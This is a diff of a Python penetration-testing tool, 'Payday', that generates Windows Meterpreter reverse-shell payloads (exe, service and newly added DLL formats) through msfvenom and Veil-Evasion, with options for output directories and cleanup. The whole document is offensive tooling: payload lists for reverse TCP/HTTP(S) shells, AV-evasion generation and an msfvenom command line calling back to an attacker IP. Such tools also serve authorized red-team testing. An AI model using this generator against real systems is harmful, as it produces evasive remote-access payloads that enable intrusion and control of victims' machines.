@@ -1,12 +1,13 @@
 #!/usr/bin/python
 # Author : Matt Lorentzen
-# version 0.3
+# version 0.4
 
 import os, sys, time, argparse
 
 def banner():
 
-
+	version = "the beanster edition"
+    
 	banner = """
                        _
  _ __   __ _ _   _  __| | __ _ _   _
@@ -15,19 +16,24 @@ def banner():
 | .__/ \__,_|\__, |\__,_|\__,_|\__, |
 |_|          |___/             |___/
 
-"""
+                 %s
+""" %version
+     
 	print redtxt(banner)
+
 
 def msf_payloads(ip, output_dir):
 	# Payloads Dictionary
 	payloads = []
 
-	payloads.append(["windows/meterpreter/reverse_tcp",443, "exe", "reverse.exe"])
-	payloads.append(["windows/x64/meterpreter/reverse_tcp", 443, "exe", "reverse64.exe"])
+	payloads.append(["windows/meterpreter/reverse_tcp",443, "exe", "revmet.exe"])
+	payloads.append(["windows/x64/meterpreter/reverse_tcp", 443, "exe", "revmet64.exe"])
 	payloads.append(["windows/meterpreter/reverse_http",443, "exe", "methttp.exe"])
 	payloads.append(["windows/meterpreter/reverse_https",443, "exe", "methttps.exe"])
 	payloads.append(["windows/x64/meterpreter/reverse_tcp",443, "exe-service" , "serv64.exe"])
-	payloads.append(["windows/meterpreter/reverse_tcp", 443, "exe-service" ,"serv.exe"])
+	payloads.append(["windows/meterpreter/reverse_tcp",443, "exe-service" ,"serv.exe"])
+	payloads.append(["windows/meterpreter/reverse_tcp",443, "dll", "revmetdll.dll"])
+	payloads.append(["windows/x64/meterpreter/reverse_tcp",443, "dll", "revmetdll64.dll"])
 
 	#./msfvenom -p windows/meterpreter/reverse_tcp lhost=[Attacker's IP] lport=4444 -f exe -o /tmp/my_payload.exe
 
@@ -60,9 +66,9 @@ def veil_payloads(ip, output_dir, move_payloads):
 	# Veil doesn't have a custom output directory option and the default path gets pulled from the config file
 	# hacky approach :: copy each generated payload and hander in to the custom output directory if it is supplied
 	veil_script = "/root/tools/attacking/Veil/Veil-Evasion/./Veil-Evasion.py "
-	#start empty list to hold
+	# start empty list to hold
 	payloads = []
-	#appends payloads with nested 3 value list for dynamic parm calling
+	# appends payloads with nested 3 value list for dynamic parm calling
 	payloads.append(["cs/meterpreter/rev_https", 443, "veil_rev_https"])
 	payloads.append(["c/meterpreter/rev_tcp",443,"veil_rev_tcp_met"])
 	payloads.append(["c/meterpreter/rev_http_service",443, "veil_rev_http_srv"])
@@ -83,9 +89,9 @@ def veil_payloads(ip, output_dir, move_payloads):
 		if move_payloads == True:
 			# move payload
 			os.system("mv /root/payloads/windows/" + output + ".exe "  + output_dir)
+			os.system("mv /root/payloads/windows/" + output + ".dll "  + output_dir)
 			# move handler
 			os.system("mv /root/payloads/windows/handlers/" + output + "_handler.rc " + output_dir + "handlers")
-
 
 
 def clean(payload_path):
@@ -152,16 +158,15 @@ def bluetxt(text2colour):
 ##############################
 
 
-
-
 def Main():
 	# program version
 	version = 0.3
 	banner()
+	default_path = '/root/payloads/windows'
 
-	parser = argparse.ArgumentParser(description="Payday Payload Generator :: Takes the IP Address and then builds meterpreter windows payloads using msfvenom and veil.\nOutputs to '/root/payloads/windows/' by default.")
-	parser.add_argument("--veil", action="store_true", help='Generate Veil Payloads')
-	parser.add_argument("--msf", action="store_true", help='Generate MSF Payloads')
+	parser = argparse.ArgumentParser(description="Payday Payload Generator :: Takes the IP Address and then builds meterpreter windows payloads using msfvenom and veil. Outputs to '/root/payloads/windows/' by default.")
+	parser.add_argument("--veil", action="store_true", help='Veil Payloads')
+	parser.add_argument("--msf", action="store_true", help='MSF Payloads > tcp/exe, tcp/http(s), exe-service, dll')
 	parser.add_argument("--clean", action="store_true", help="Cleans out existing files in the output directory")
 	parser.add_argument("--output", help="Specify new output directory.")
 	parser.add_argument("--ip", help='Specify Local IP Address for reverse connections')
@@ -169,6 +174,7 @@ def Main():
 	# counts the supplied number of arguments and prints help if they are missing
 	if len(sys.argv)==1:
 		parser.print_help()
+			
 		sys.exit(1)
 
 	args = parser.parse_args()
@@ -187,14 +193,29 @@ def Main():
 	else:
 		# default directory output :: Veil config points to the this location
 		output_dir = "/root/payloads/windows/"
+		# add check to see if this direcory exists and if not, create it
+		if not os.path.isdir(output_dir):
+			print bluetxt("[*] The default path : %s is missing") %output_dir
+			print yellowtxt("[!] You need to create this default path")
+			sys.exit(1)
+			#os.mkdir(output_dir)
+			#os.chdir(output_dir)
+			#os.mkdir('handlers')
+
 
 	if args.msf:
-		print yellowtxt("[!] Encoding MSF Payloads")
-		msf_payloads(ip, output_dir)
+		if not ip:
+			print "[!] IP address required with this payload option :: --msf --ip <Address>"
+		else:
+			print yellowtxt("[!] Encoding MSF Payloads")
+			msf_payloads(ip, output_dir)
 
 	if args.veil:
-		print yellowtxt("[!] Encoding Veil payloads")
-		veil_payloads(ip ,output_dir, move_payloads)
+		if not ip:
+			print "[!] IP address required with this payload option :: --veil --ip <Address>"
+		else:
+			print yellowtxt("[!] Encoding Veil payloads")
+			veil_payloads(ip ,output_dir, move_payloads)
 
 	if args.clean:
 		if args.output:
